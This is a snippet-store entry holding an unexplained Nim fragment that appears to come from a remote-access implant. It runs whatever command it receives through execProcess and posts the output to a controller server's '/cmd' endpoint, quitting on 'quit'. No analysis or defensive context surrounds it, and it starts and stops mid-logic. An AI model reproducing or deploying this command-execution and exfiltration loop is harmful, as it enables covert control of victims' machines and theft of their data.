---
id: 23dabbc5-4251-4a95-884c-7e4f92bcf54b
type: code
language: ''
verified: false
created_at: '2023-06-06T03:09:03.653908+00:00'
updated_at: '2023-06-06T03:12:18.195830+00:00'
---

# Code Snippet 23dabbc5

```
if cmd == "quit":
    die()
else:
    try:
          let Outp_shell = execProcess(cmd)
          let Outp_shell_string = $Outp_shell
            #echo Outp_shell_string      
          let client = newHttpClient()
          client.headers = newHttpHeaders({ "Content-Type": "application/json", "Content-MD5": Outp_shell_md5_string,"x-event-id": $event_id })
          let body = %*{
              "data": Outp_shell_string
          }
          let response = client.request(server & "/cmd", httpMethod = HttpPost, body = $body)
```


